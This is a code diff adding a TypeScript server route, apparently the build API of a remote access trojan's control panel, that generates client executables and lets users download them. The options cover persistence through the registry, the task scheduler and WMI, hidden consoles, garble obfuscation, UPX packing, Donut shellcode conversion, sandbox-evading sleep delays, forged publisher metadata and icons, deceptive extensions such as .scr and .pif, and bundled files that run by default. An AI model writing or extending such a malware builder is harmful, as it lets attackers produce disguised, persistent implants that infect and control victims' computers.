@@ -1,0 +1,466 @@
+import { v4 as uuidv4 } from "uuid";
+import { authenticateRequest } from "../../auth";
+import { AuditAction, logAudit } from "../../auditLog";
+import * as buildManager from "../../build/buildManager";
+import { deleteBuild, getAllBuilds, getBuild } from "../../db";
+import { requirePermission } from "../../rbac";
+import { logger } from "../../logger";
+import path from "path";
+import fs from "fs";
+import { resolveRuntimeRoot } from "../runtime-paths";
+
+type RequestIpProvider = {
+  requestIP: (req: Request) => { address?: string } | null | undefined;
+};
+
+type BuildRouteDeps = {
+  startBuildProcess: (buildId: string, config: any) => Promise<void>;
+  sanitizeMutex: (value?: string) => string | undefined;
+  allowedPlatforms: Set<string>;
+};
+
+export async function handleBuildRoutes(
+  req: Request,
+  url: URL,
+  server: RequestIpProvider,
+  deps: BuildRouteDeps,
+): Promise<Response | null> {
+  if (!url.pathname.startsWith("/api/build")) {
+    return null;
+  }
+
+  try {
+    const user = await authenticateRequest(req);
+    if (!user) {
+      return new Response("Unauthorized", { status: 401 });
+    }
+
+    if (req.method === "POST" && url.pathname === "/api/build/start") {
+      requirePermission(user, "clients:build");
+
+      const body = await req.json();
+      const {
+        platforms,
+        serverUrl,
+        rawServerList,
+        stripDebug,
+        disableCgo,
+        obfuscate,
+        enablePersistence,
+        persistenceMethods,
+        startupName,
+        mutex,
+        disableMutex,
+        hideConsole,
+        noPrinting,
+        outputName,
+        garbleLiterals,
+        garbleTiny,
+        garbleSeed,
+        assemblyTitle,
+        assemblyProduct,
+        assemblyCompany,
+        assemblyVersion,
+        assemblyCopyright,
+        iconBase64,
+        enableUpx,
+        upxStripHeaders,
+        enableDonut,
+        enableTyphon,
+        typhonVariant,
+        enableVault,
+        vaultRecipient,
+        requireAdmin,
+        outputExtension,
+        sleepSeconds,
+        boundFiles,
+      } = body;
+
+      if (!platforms || !Array.isArray(platforms) || platforms.length === 0) {
+        return Response.json({ error: "No platforms specified" }, { status: 400 });
+      }
+
+      let safeMutex: string | undefined;
+      try {
+        safeMutex = typeof mutex === "string" ? deps.sanitizeMutex(mutex) : undefined;
+      } catch (err: any) {
+        return Response.json({ error: err?.message || "Invalid mutex" }, { status: 400 });
+      }
+      const safeDisableMutex = !!disableMutex;
+      const sanitizedPlatforms = platforms.filter((p: string) => typeof p === "string");
+      if (sanitizedPlatforms.length !== platforms.length) {
+        return Response.json({ error: "Invalid platform entries" }, { status: 400 });
+      }
+      const allowedPlatforms = sanitizedPlatforms.filter((p: string) =>
+        deps.allowedPlatforms.has(p),
+      );
+      if (allowedPlatforms.length === 0) {
+        return Response.json({ error: "No valid platforms specified" }, { status: 400 });
+      }
+
+      const safeRawServerList = !!rawServerList;
+      const safeServerUrl =
+        typeof serverUrl === "string" && serverUrl.trim() !== ""
+          ? serverUrl.trim()
+          : undefined;
+      if (safeRawServerList) {
+        if (!safeServerUrl) {
+          return Response.json(
+            { error: "Raw server list requires a server URL" },
+            { status: 400 },
+          );
+        }
+        try {
+          const parsed = new URL(safeServerUrl);
+          if (parsed.protocol !== "https:") {
+            return Response.json(
+              { error: "Raw server list URL must use https" },
+              { status: 400 },
+            );
+          }
+        } catch {
+          return Response.json({ error: "Invalid raw server list URL" }, { status: 400 });
+        }
+      }
+
+      const buildId = uuidv4();
+      const ip = server.requestIP(req)?.address || "unknown";
+
+      logAudit({
+        timestamp: Date.now(),
+        username: user.username,
+        ip,
+        action: AuditAction.COMMAND,
+        details: `Started build ${buildId} for platforms: ${allowedPlatforms.join(", ")}`,
+        success: true,
+      });
+
+      const safeNoPrinting = !!noPrinting;
+      const VALID_PERSISTENCE_METHODS = new Set(['startup', 'registry', 'taskscheduler', 'wmi']);
+      const safePersistenceMethods: string[] =
+        Array.isArray(persistenceMethods)
+          ? persistenceMethods
+              .filter((m: unknown) => typeof m === 'string' && VALID_PERSISTENCE_METHODS.has((m as string).toLowerCase()))
+              .map((m: string) => m.toLowerCase())
+          : ['startup'];
+      if (safePersistenceMethods.length === 0) safePersistenceMethods.push('startup');
+      const safeStartupName =
+        typeof startupName === 'string' && /^[A-Za-z0-9_-]{1,32}$/.test(startupName.trim())
+          ? startupName.trim()
+          : undefined;
+      const safeOutputName = typeof outputName === "string" && /^[A-Za-z0-9._-]{1,64}$/.test(outputName.trim())
+        ? outputName.trim()
+        : undefined;
+      const safeGarbleSeed = typeof garbleSeed === "string" && /^[A-Za-z0-9]{1,64}$/.test(garbleSeed.trim())
+        ? garbleSeed.trim()
+        : undefined;
+      const safeAssemblyVersion = typeof assemblyVersion === "string" && /^\d{1,5}\.\d{1,5}\.\d{1,5}\.\d{1,5}$/.test(assemblyVersion.trim())
+        ? assemblyVersion.trim()
+        : undefined;
+      const safeStr = (val: any, max = 128) =>
+        typeof val === "string" && val.trim().length > 0 ? val.trim().slice(0, max) : undefined;
+      const safeIconBase64 = typeof iconBase64 === "string" && iconBase64.length > 0 && iconBase64.length <= 2 * 1024 * 1024
+        ? iconBase64
+        : undefined;
+      const safeRequireAdmin = !!requireAdmin;
+      const VALID_OUTPUT_EXTENSIONS = new Set([".exe", ".scr", ".bat", ".cmd", ".pif", ".com"]);
+      const safeOutputExtension =
+        typeof outputExtension === "string" && VALID_OUTPUT_EXTENSIONS.has(outputExtension.toLowerCase())
+          ? outputExtension.toLowerCase() : ".exe";
+      const safeSleepSeconds =
+        typeof sleepSeconds === "number" && Number.isInteger(sleepSeconds) && sleepSeconds >= 0 && sleepSeconds <= 3600
+          ? sleepSeconds : 0;
+      const VALID_TYPHON_VARIANTS = new Set(["1", "2", "3", "4", "5", "6", "7", "8", "all", "safe", "rec"]);
+      const safeTyphonVariant =
+        typeof typhonVariant === "string" && VALID_TYPHON_VARIANTS.has(typhonVariant.trim().toLowerCase())
+          ? typhonVariant.trim().toLowerCase()
+          : "1";
+
+      const MAX_BOUND_FILES = 5;
+      const MAX_BOUND_FILE_BYTES = 10 * 1024 * 1024;
+      const ALLOWED_BIND_TARGET_OS = new Set(["windows", "linux", "darwin"]);
+      const RESERVED_BIND_NAMES = new Set(["manifest.json"]);
+      type SafeBoundFile = { name: string; data: string; targetOS: string[]; execute: boolean };
+      let safeBoundFiles: SafeBoundFile[] | undefined;
+      if (Array.isArray(boundFiles) && boundFiles.length > 0) {
+        if (boundFiles.length > MAX_BOUND_FILES) {
+          return Response.json({ error: `Maximum ${MAX_BOUND_FILES} bound files allowed` }, { status: 400 });
+        }
+        const seenNames = new Set<string>();
+        const validated: SafeBoundFile[] = [];
+        for (const f of boundFiles) {
+          if (!f || typeof f !== "object") {
+            return Response.json({ error: "Invalid bound file entry" }, { status: 400 });
+          }
+          const rawName = typeof f.name === "string" ? f.name : "";
+          const safeName = rawName.replace(/[^A-Za-z0-9._-]/g, "").slice(0, 64);
+          if (!safeName) {
+            return Response.json({ error: "Bound file has an invalid name" }, { status: 400 });
+          }
+          if (RESERVED_BIND_NAMES.has(safeName)) {
+            return Response.json({ error: `'${safeName}' is a reserved filename` }, { status: 400 });
+          }
+          if (seenNames.has(safeName)) {
+            return Response.json({ error: `Duplicate bound file name: ${safeName}` }, { status: 400 });
+          }
+          seenNames.add(safeName);
+          if (typeof f.data !== "string" || f.data.length === 0) {
+            return Response.json({ error: `Bound file '${safeName}' has no data` }, { status: 400 });
+          }
+          const approxDecodedBytes = Math.floor(f.data.length * 3 / 4);
+          if (approxDecodedBytes > MAX_BOUND_FILE_BYTES) {
+            return Response.json({ error: `Bound file '${safeName}' exceeds the 10 MB limit` }, { status: 400 });
+          }
+          const safeTargetOS = Array.isArray(f.targetOS)
+            ? f.targetOS.filter((o: unknown) => typeof o === "string" && ALLOWED_BIND_TARGET_OS.has(o as string)) as string[]
+            : [];
+          validated.push({
+            name: safeName,
+            data: f.data,
+            targetOS: safeTargetOS,
+            execute: f.execute !== false, // default true
+          });
+        }
+        safeBoundFiles = validated;
+      }
+
+      deps.startBuildProcess(buildId, {
+        platforms: allowedPlatforms,
+        serverUrl: safeServerUrl,
+        rawServerList: safeRawServerList,
+        mutex: safeMutex,
+        disableMutex: safeDisableMutex,
+        stripDebug,
+        disableCgo,
+        obfuscate: !!obfuscate,
+        enablePersistence,
+        persistenceMethods: safePersistenceMethods,
+        startupName: safeStartupName,
+        hideConsole: !!hideConsole,
+        noPrinting: safeNoPrinting,
+        builtByUserId: user.userId,
+        outputName: safeOutputName,
+        garbleLiterals: !!garbleLiterals,
+        garbleTiny: !!garbleTiny,
+        garbleSeed: safeGarbleSeed,
+        assemblyTitle: safeStr(assemblyTitle),
+        assemblyProduct: safeStr(assemblyProduct),
+        assemblyCompany: safeStr(assemblyCompany),
+        assemblyVersion: safeAssemblyVersion,
+        assemblyCopyright: safeStr(assemblyCopyright),
+        iconBase64: safeIconBase64,
+        enableUpx: !!enableUpx,
+        upxStripHeaders: !!upxStripHeaders,
+        enableDonut: !!enableDonut,
+        enableTyphon: !!enableTyphon,
+        typhonVariant: !!enableTyphon ? safeTyphonVariant : undefined,
+        enableVault: !!enableVault,
+        vaultRecipient: !!enableVault && typeof vaultRecipient === "string" && vaultRecipient.trim().length > 0
+          ? vaultRecipient.trim().slice(0, 512)
+          : undefined,
+        requireAdmin: safeRequireAdmin,
+        outputExtension: safeOutputExtension,
+        sleepSeconds: safeSleepSeconds,
+        boundFiles: safeBoundFiles,
+      });
+
+      return Response.json({ buildId });
+    }
+
+    if (req.method === "GET" && url.pathname === "/api/build/list") {
+      requirePermission(user, "clients:build");
+
+      const builds = getAllBuilds(user.userId, user.role);
+      return Response.json({ builds });
+    }
+
+    if (req.method === "DELETE" && url.pathname.match(/^\/api\/build\/(.+)\/delete$/)) {
+      requirePermission(user, "clients:build");
+
+      const buildId = decodeURIComponent(url.pathname.split("/")[3]);
+
+      const build = getBuild(buildId);
+      if (!build) {
+        return new Response("Not Found", { status: 404 });
+      }
+      if (build.builtByUserId && build.builtByUserId !== user.userId && user.role !== "admin") {
+        return new Response("Forbidden", { status: 403 });
+      }
+      if (build.files) {
+        const rootDir = resolveRuntimeRoot();
+        const outDir = path.join(rootDir, "dist-clients");
+        for (const file of build.files) {
+          try {
+            const filePath = path.join(outDir, file.filename);
+            if (fs.existsSync(filePath)) {
+              fs.unlinkSync(filePath);
+              logger.info(`[build:delete] Removed file: ${filePath}`);
+            }
+          } catch (err) {
+            logger.warn(`[build:delete] Failed to remove file ${file.filename}:`, err);
+          }
+        }
+      }
+
+      buildManager.deleteBuildStream(buildId);
+      deleteBuild(buildId);
+
+      const ip = server.requestIP(req)?.address || "unknown";
+      logAudit({
+        timestamp: Date.now(),
+        username: user.username,
+        ip,
+        action: AuditAction.COMMAND,
+        details: `Deleted build ${buildId}`,
+        success: true,
+      });
+
+      logger.info(`[build:delete] Build ${buildId.substring(0, 8)} deleted by ${user.username}`);
+      return Response.json({ success: true });
+    }
+
+    if (req.method === "GET" && url.pathname.match(/^\/api\/build\/(.+)\/stream$/)) {
+      requirePermission(user, "clients:build");
+
+      const buildId = url.pathname.split("/")[3];
+      const build = buildManager.getBuildStream(buildId);
+
+      if (!build) {
+        return Response.json({ error: "Build not found" }, { status: 404 });
+      }
+      if (build.userId && build.userId !== user.userId && user.role !== "admin") {
+        return new Response("Forbidden", { status: 403 });
+      }
+
+      logger.info(`[build:${buildId.substring(0, 8)}] Client connected to stream`);
+
+      const stream = new ReadableStream({
+        start(controller) {
+          build.controllers.push(controller);
+          logger.info(
+            `[build:${buildId.substring(0, 8)}] Added controller, total: ${build.controllers.length}`,
+          );
+
+          const encoder = new TextEncoder();
+          try {
+            controller.enqueue(
+              encoder.encode(
+                `data: ${JSON.stringify({ type: "status", text: "Connected to build stream" })}\n\n`,
+              ),
+            );
+          } catch (err) {
+            logger.error(
+              `[build:${buildId.substring(0, 8)}] Failed to send initial message:`,
+              err,
+            );
+          }
+        },
+        cancel() {
+          const index = build.controllers.indexOf(this as any);
+          if (index > -1) {
+            build.controllers.splice(index, 1);
+            logger.info(
+              `[build:${buildId.substring(0, 8)}] Controller removed, remaining: ${build.controllers.length}`,
+            );
+          }
+        },
+      });
+
+      return new Response(stream, {
+        headers: {
+          "Content-Type": "text/event-stream",
+          "Cache-Control": "no-cache",
+          Connection: "keep-alive",
+          "X-Accel-Buffering": "no",
+        },
+      });
+    }
+
+    if (req.method === "GET" && url.pathname.match(/^\/api\/build\/(.+)\/info$/)) {
+      requirePermission(user, "clients:build");
+
+      const buildId = url.pathname.split("/")[3];
+      const build = buildManager.getBuildStream(buildId);
+
+      if (!build) {
+        const dbBuild = getBuild(buildId);
+        if (!dbBuild) {
+          return Response.json({ error: "Build not found" }, { status: 404 });
+        }
+        if (dbBuild.builtByUserId && dbBuild.builtByUserId !== user.userId && user.role !== "admin") {
+          return new Response("Forbidden", { status: 403 });
+        }
+        return Response.json({
+          id: dbBuild.id,
+          status: dbBuild.status,
+          startTime: dbBuild.startTime,
+          expiresAt: dbBuild.expiresAt,
+          files: dbBuild.files,
+        });
+      }
+
+      if (build.userId && build.userId !== user.userId && user.role !== "admin") {
+        return new Response("Forbidden", { status: 403 });
+      }
+      return Response.json({
+        id: build.id,
+        status: build.status,
+        startTime: build.startTime,
+        expiresAt: build.expiresAt,
+        files: build.files,
+      });
+    }
+
+    if (req.method === "GET" && url.pathname.match(/^\/api\/build\/download\//)) {
+      requirePermission(user, "clients:build");
+
+      const rawName = url.pathname.split("/api/build/download/")[1] || "";
+      let fileName = rawName;
+      try {
+        fileName = decodeURIComponent(rawName);
+      } catch {
+        return Response.json({ error: "Bad request" }, { status: 400 });
+      }
+
+      if (
+        !fileName ||
+        fileName.includes("\u0000") ||
+        fileName.includes("/") ||
+        fileName.includes("\\")
+      ) {
+        return Response.json({ error: "File not found" }, { status: 404 });
+      }
+
+      const rootDir = resolveRuntimeRoot();
+      const distRoot = path.resolve(rootDir, "dist-clients");
+      const filePath = path.resolve(distRoot, fileName);
+      const rootWithSep = distRoot.endsWith(path.sep)
+        ? distRoot
+        : `${distRoot}${path.sep}`;
+
+      if (!filePath.startsWith(rootWithSep)) {
+        return Response.json({ error: "File not found" }, { status: 404 });
+      }
+
+      const file = Bun.file(filePath);
+      if (!(await file.exists())) {
+        return Response.json({ error: "File not found" }, { status: 404 });
+      }
+
+      return new Response(file, {
+        headers: {
+          "Content-Type": "application/octet-stream",
+          "Content-Disposition": `attachment; filename="${fileName}"`,
+        },
+      });
+    }
+
+    return new Response("Not found", { status: 404 });
+  } catch (error) {
+    if (error instanceof Response) {
+      return error;
+    }
+    logger.error("[build] API error:", error);
+    return Response.json({ error: "Internal server error" }, { status: 500 });
+  }
+}
